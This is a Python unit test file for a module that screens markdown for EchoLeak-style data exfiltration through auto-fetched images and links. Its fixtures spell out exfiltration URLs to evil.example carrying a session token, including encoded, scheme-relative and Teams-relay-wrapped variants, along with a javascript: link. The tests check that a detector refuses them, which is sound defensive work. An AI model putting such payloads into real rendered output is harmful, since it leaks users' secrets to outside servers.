"""Unit tests for gov.egress_refs (wave-273 lane I).

Tests at the public seams: extract_egress_refs, screen_egress_refs,
EgressPolicy, MarkdownAutoFetchChannel. Expected values are worked
examples (EchoLeak-shaped fixtures), never recomputed from the code.
"""

import hashlib
import os
import re
import sys
import unittest
import urllib.parse

_HERE = os.path.dirname(os.path.abspath(__file__))
_REPO = os.path.dirname(_HERE)
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)

from gov import decision_codes  # noqa: E402
from gov import egress_refs as er  # noqa: E402

# Wave-273 merge: pin 1443 -> 1458 (+15 codes: 1 sandbox-* + 10
# bundle-delivery-* + 4 egress-ref-*).
TAXONOMY_PIN = 1995 # Wave-283 lane 5: pin 1579 -> 1581 (+2 finding-*).; Wave-283 merge: pin 1581 -> 1587 (+6 inventory-*).; Wave-284 lane 1: pin 1587 -> 1588 (+1 discovery-emit-failed).; Wave-284 merge: pin 1588 -> 1621 (+1 discovery-emit-failed +4 manifest-* +7 guac-graph-* +8 envelope-*/recipient-policy +6 sandbox-policy-* +8 keyset-*).; Wave-286 merge: pin 1641 -> 1660; Wave-287 merge: pin 1660 -> 1684 (+7 tsa-* +7 evidence-provenance +10 trustvec-*) (+1 manifest-regex-unsafe +1 keyset-pin-key-invalid +6 receipt-* +11 toolcall-*).; Wave-288 merge: pin 1684 -> 1700 (+16: 1 toolcall-exception-scope-mismatch +1 toolcall-regex-unsafe +1 toolcall-invalid-call +7 admission-* +6 posture-*); Wave-289 merge: pin 1700 -> 1706 (+6 challenge-*); Wave-293 merge: pin 1730 -> 1730 (renumber F361->F364, no new codes). Wave-294 merge: pin 1730 -> 1742 (+12: 4 coord-lease-* + 4 toolcall/toolfilter-* + 4 toolcall-schema-*); Wave-295 lane 1: pin 1742 -> 1743 (+1 toolcall-secret-scan-incomplete); Wave-295 merge: pin 1743 -> 1750 (+8: 1 toolcall-secret-scan-incomplete + 3 toolcall-predicate-* + 4 coord-state-*); Wave-299 merge: pin 1780 -> 1797 (+17 codes: 4 delegation-* + 4 delegation-ticket-* + 3 supervision-capability-* + 3 delegation-revocation-* + 3 delegation-identity-*); Wave-302 merge: pin 1812 -> 1820 (+8 codes: 3 workflow-composed-* + 3 workflow-branch-* + 2 workflow-approval-*); Wave-303 merge: pin 1823 -> 1826 (+6 codes: 1 workflow-idempotency-caller-mismatch +2 workflow-saga-operator-unauthorized/resolution-invalid +3 authority-lifecycle-*); Wave-312 lane D: pin 1841 -> 1851 (+10: 8 witness-log-* + 2 evidence-bundle-witness-*); Wave-315 lane 2: pin 1878 -> 1888 (+10 vsa-packet-*); Wave-316 lane 4: pin 1888 -> 1900 (+12 transform-*); Wave-318 merge: pin 1900 -> 1906 (+6 trust-root-*); Wave-319 lane 3: pin 1906 -> 1916 (+10 witness-*); Wave-319 merge: pin 1906 -> 1933 (+27: 9 grantneg-* +8 identity-* +10 witness-*); Wave-320 lane 2: pin 1933 -> 1934 (+1 grantneg-registry-withdrawn)

EXPECTED_CODES = (
    "egress-ref-data-exfil",
    "egress-refs-malformed",
    "egress-refs-oversized",
    "egress-relay-exfil",
)

RELAY = ("teams.microsoft.com", "/urlp/v1/url/content")
TOKEN = "session-token-9f8e7d6c5b4a"


def _policy(**kw):
    kw.setdefault("trusted_relays", [RELAY])
    kw.setdefault("allowed_hosts", ("cdn.corp.example",))
    kw.setdefault("sensitive_digests",
                   frozenset([hashlib.sha256(TOKEN.encode()).hexdigest()]))
    return er.EgressPolicy(**kw)


class TestCodesRegistered(unittest.TestCase):
    def test_codes_in_taxonomy(self):
        for code in EXPECTED_CODES:
            self.assertIn(code, decision_codes.TAXONOMY)

    def test_pin_from_raw_literals(self):
        src = open(os.path.join(_REPO, "gov", "decision_codes.py")).read()
        codes = re.findall(
            r'"code":\s*[\'"]([a-z][a-z0-9-_.]*)[\'"]', src)
        self.assertEqual(len(codes), TAXONOMY_PIN)
        self.assertEqual(len(set(codes)), TAXONOMY_PIN)

    def test_sorted_position(self):
        src = open(os.path.join(_REPO, "gov", "decision_codes.py")).read()
        codes = re.findall(
            r"^    '([a-z][a-z0-9_.-]*)': \{$", src, re.M)
        self.assertEqual(codes, sorted(codes))


class TestExtraction(unittest.TestCase):
    def test_inline_image(self):
        rec = er.extract_egress_refs("![a](https://x.example/i.png)")
        self.assertEqual(rec["verdict"], "ok")
        self.assertEqual(len(rec["refs"]), 1)
        r = rec["refs"][0]
        self.assertEqual(r["kind"], "image-inline")
        self.assertEqual(r["url"], "https://x.example/i.png")
        self.assertEqual(r["provenance"], "rendered")

    def test_reference_style_resolves(self):
        # The EchoLeak redaction-bypass shape.
        content = "![x][img1]\n\n[img1]: https://evil.example/a.png\n"
        rec = er.extract_egress_refs(content)
        self.assertEqual(len(rec["refs"]), 1)
        r = rec["refs"][0]
        self.assertEqual(r["kind"], "image-reference")
        self.assertEqual(r["url"], "https://evil.example/a.png")

    def test_reference_id_case_insensitive(self):
        content = "[t][AbC]\n\n[abc]: https://evil.example/b.png\n"
        rec = er.extract_egress_refs(content)
        self.assertEqual(rec["refs"][0]["url"],
                         "https://evil.example/b.png")

    def test_html_img(self):
        rec = er.extract_egress_refs('<img src="https://x.example/a.png">')
        self.assertEqual(rec["refs"][0]["kind"], "img-html")

    def test_bare_url_is_preview_provenance(self):
        rec = er.extract_egress_refs("go to https://x.example/p now")
        self.assertEqual(len(rec["refs"]), 1)
        r = rec["refs"][0]
        self.assertEqual(r["kind"], "url-plain")
        self.assertEqual(r["provenance"], "rendered-preview")

    def test_bytes_input_decoded(self):
        rec = er.extract_egress_refs(b"[a](https://x.example/)")
        self.assertEqual(rec["verdict"], "ok")
        self.assertEqual(len(rec["refs"]), 1)

    def test_no_double_count_of_definition_line(self):
        # The [id]: url definition line must not itself become a ref.
        content = "![x][i]\n\n[i]: https://evil.example/a.png\n"
        rec = er.extract_egress_refs(content)
        self.assertEqual(len(rec["refs"]), 1)


class TestScreening(unittest.TestCase):
    def test_relay_exfil_refused(self):
        inner = ("https://evil.example/collect?d="
                 + "D" * 600)
        relay = ("https://teams.microsoft.com/urlp/v1/url/content?url="
                 + urllib.parse.quote(inner, safe=""))
        rec = er.screen_egress_refs("![x][i]\n\n[i]: " + relay + "\n",
                                    _policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-relay-exfil")

    def test_relay_digest_through_relay_refused(self):
        # Regression: a sensitive-digest token in a SHORT clean inner
        # query must refuse. Digest matching runs on the DECODED inner
        # target; the outer query is percent-encoded and would glue the
        # token to %-fragments.
        inner = "https://evil.example/collect?tok=" + TOKEN
        relay = ("https://teams.microsoft.com/urlp/v1/url/content?url="
                 + urllib.parse.quote(inner, safe=""))
        rec = er.screen_egress_refs("[x](" + relay + ")", _policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-relay-exfil")

    def test_relay_clean_external_inner_allowed(self):
        inner = "https://news.example/article?id=42"
        relay = ("https://teams.microsoft.com/urlp/v1/url/content?url="
                 + urllib.parse.quote(inner, safe=""))
        rec = er.screen_egress_refs("[n](" + relay + ")", _policy())
        self.assertEqual(rec["verdict"], "allow")

    def test_sensitive_digest_refused(self):
        rec = er.screen_egress_refs(
            "[d](https://evil.example/x?tok=" + TOKEN + ")", _policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-ref-data-exfil")

    def test_oversized_payload_refused(self):
        rec = er.screen_egress_refs(
            "![x](https://evil.example/p.png?q=" + "Q" * 600 + ")",
            _policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-ref-data-exfil")

    def test_allowed_host_exempt(self):
        rec = er.screen_egress_refs(
            "![x](https://cdn.corp.example/i.png?" + "v" * 900 + ")",
            _policy())
        self.assertEqual(rec["verdict"], "allow")

    def test_relative_ref_allowed(self):
        rec = er.screen_egress_refs("![x](/static/logo.png)", _policy())
        self.assertEqual(rec["verdict"], "allow")
        self.assertEqual(rec["refs"][0]["screen"]["note"], "not-external")

    def test_mailto_allowed(self):
        rec = er.screen_egress_refs("[m](mailto:a@b.c)", _policy())
        self.assertEqual(rec["verdict"], "allow")

    def test_first_flagged_code_wins(self):
        rec = er.screen_egress_refs(
            "![a](https://evil.example/1.png?q=" + "Q" * 600 + ") "
            "[b](https://evil.example/2?tok=" + TOKEN + ")",
            _policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(len(rec["flagged"]), 2)
        self.assertEqual(rec["code"], "egress-ref-data-exfil")

    def test_out_of_scope_on_every_verdict(self):
        for content in ("plain text",
                        "![x](https://evil.example/p.png?q=" + "Q" * 600 + ")"):
            rec = er.screen_egress_refs(content, _policy())
            self.assertIn("client-performs-fetch", rec["out_of_scope"])


class TestF288F289Closures(unittest.TestCase):
    """Wave-275 lane A: scheme-relative screening + digest-leg decoding."""

    _TOK = "CLOSURE-UNIT-TOKEN-3e7f2b"

    def _policy(self):
        return er.EgressPolicy(
            trusted_relays=[RELAY],
            allowed_hosts=("cdn.corp.example",),
            sensitive_digests=frozenset([
                hashlib.sha256(self._TOK.encode()).hexdigest()]))

    def test_scheme_relative_is_external(self):
        # urlsplit of "//h/p" has empty scheme but a real netloc.
        split = er._split_url("//evil.example.com/c?tok=" + self._TOK)
        self.assertEqual(split[0], "https")
        self.assertEqual(split[1], "evil.example.com")

    def test_scheme_relative_digest_refused(self):
        rec = er.screen_egress_refs(
            "![x](//evil.example.com/c?tok=%s)" % self._TOK, self._policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-ref-data-exfil")

    def test_scheme_relative_relay_inner_refused(self):
        inner = "//evil.example.com/c?tok=" + self._TOK
        url = ("https://teams.microsoft.com/urlp/v1/url/content?url="
               + urllib.parse.quote(inner, safe=""))
        rec = er.screen_egress_refs("![x](%s)" % url, self._policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-relay-exfil")

    def test_genuinely_relative_stays_allowed(self):
        for u in ("/static/logo.png", "#frag", "img.png"):
            rec = er.screen_egress_refs("![x](%s)" % u, self._policy())
            self.assertEqual(rec["verdict"], "allow", u)
            self.assertEqual(rec["refs"][0]["screen"]["note"],
                             "not-external", u)

    def test_allowed_host_scheme_relative(self):
        rec = er.screen_egress_refs(
            "![logo](//cdn.corp.example/logo.png)", self._policy())
        self.assertEqual(rec["verdict"], "allow")

    def test_single_encoded_digest_refused(self):
        enc = "".join("%%%02X" % b for b in self._TOK.encode())
        rec = er.screen_egress_refs(
            "![x](https://evil.example.com/c?tok=%s)" % enc,
            self._policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-ref-data-exfil")

    def test_double_encoded_digest_refused(self):
        enc1 = "".join("%%%02X" % b for b in self._TOK.encode())
        enc2 = "".join("%%%02X" % b for b in enc1.encode())
        rec = er.screen_egress_refs(
            "![x](https://evil.example.com/c?tok=%s)" % enc2,
            self._policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-ref-data-exfil")

    def test_encoded_fragment_digest_refused(self):
        enc = "".join("%%%02X" % b for b in self._TOK.encode())
        rec = er.screen_egress_refs(
            "![x](https://evil.example.com/x#tok=%s)" % enc,
            self._policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-ref-data-exfil")

    def test_benign_encoded_stays_allowed(self):
        # Decoding must not invent digest matches: %41%42%43 is "ABC".
        rec = er.screen_egress_refs(
            "![x](https://evil.example.com/search?q=%41%42%43)",
            self._policy())
        self.assertEqual(rec["verdict"], "allow")

    def test_canon_text_plus_semantics_and_never_raises(self):
        # F289 H4 pin (code-review finding): query decoding must use
        # form semantics (+ -> space) while fragment decoding keeps
        # '+' literal. A future plus=True/False regression must fail.
        self.assertEqual(er._canon_text("a+b", plus=True), "a b")
        self.assertEqual(er._canon_text("a+b", plus=False), "a+b")
        self.assertEqual(er._canon_text("%20", plus=True), " ")
        self.assertEqual(er._canon_text("%20", plus=False), " ")
        for bad in ("%", "%zz", "%25", "a+b", "", None):
            out = er._canon_text(bad, plus=True)
            self.assertIsInstance(out, str)
            out = er._canon_text(bad, plus=False)
            self.assertIsInstance(out, str)

    def test_canon_text_decode_to_stability_f296(self):
        # F296: _canon_text must decode to stability (the attacker's
        # server decodes to stability), not stop at a fixed round cap.
        import urllib.parse
        secret = "ab/cd/ef_gh-12"
        enc = secret
        for _ in range(5):
            enc = urllib.parse.quote(enc, safe="")
        self.assertEqual(er._canon_text(enc, plus=True), secret)
        self.assertEqual(er._canon_text(enc, plus=False), secret)
        # Absurd nesting depth fails closed (None) quickly, not slowly.
        deep = "a/b"
        for _ in range(2000):
            deep = urllib.parse.quote(deep, safe="")
        import time
        t0 = time.time()
        out = er._canon_text(deep, plus=True)
        self.assertIsNone(out)
        self.assertLess(time.time() - t0, 5.0)
        # Never raises on hostile shapes, even at budget exhaustion.
        self.assertIsInstance(er._canon_text(deep, plus=False) or "", str)


class TestNeverRaises(unittest.TestCase):
    def test_hostile_inputs(self):
        for bad in (None, 123, ["x"], {"u": 1}, b"\xff\xfe\x00bad",
                    "![unclosed", "[a](javascript:alert(1))",
                    "\x00" * 100):
            for fn in (er.extract_egress_refs, er.screen_egress_refs):
                rec = fn(bad, _policy())
                self.assertIn(rec["verdict"], ("ok", "allow", "refuse"))

    def test_oversized_refused(self):
        rec = er.screen_egress_refs("x" * (2 * 1024 * 1024), _policy())
        self.assertEqual(rec["verdict"], "refuse")
        self.assertEqual(rec["code"], "egress-refs-oversized")

    def test_broken_channel_does_not_raise(self):
        class Boom(er.EgressChannel):
            channel_kind = "boom"

            def extract_refs(self, content):
                raise RuntimeError("boom")

        rec = er.extract_egress_refs("![a](https://x.example/)",
                                     channels=[Boom()])
        self.assertEqual(rec["verdict"], "ok")
        self.assertEqual(rec["refs"], [])


class TestPolicy(unittest.TestCase):
    def test_defaults(self):
        p = er.EgressPolicy()
        self.assertEqual(p.trusted_relays, ())
        self.assertEqual(p.allowed_hosts, frozenset())
        self.assertEqual(p.max_ref_payload_chars, 512)

    def test_relay_normalization(self):
        p = er.EgressPolicy(trusted_relays=[("Teams.Example.COM",
                                             "/urlp/")])
        self.assertEqual(p.trusted_relays, (("teams.example.com",
                                             "/urlp/"),))


if __name__ == "__main__":
    unittest.main()
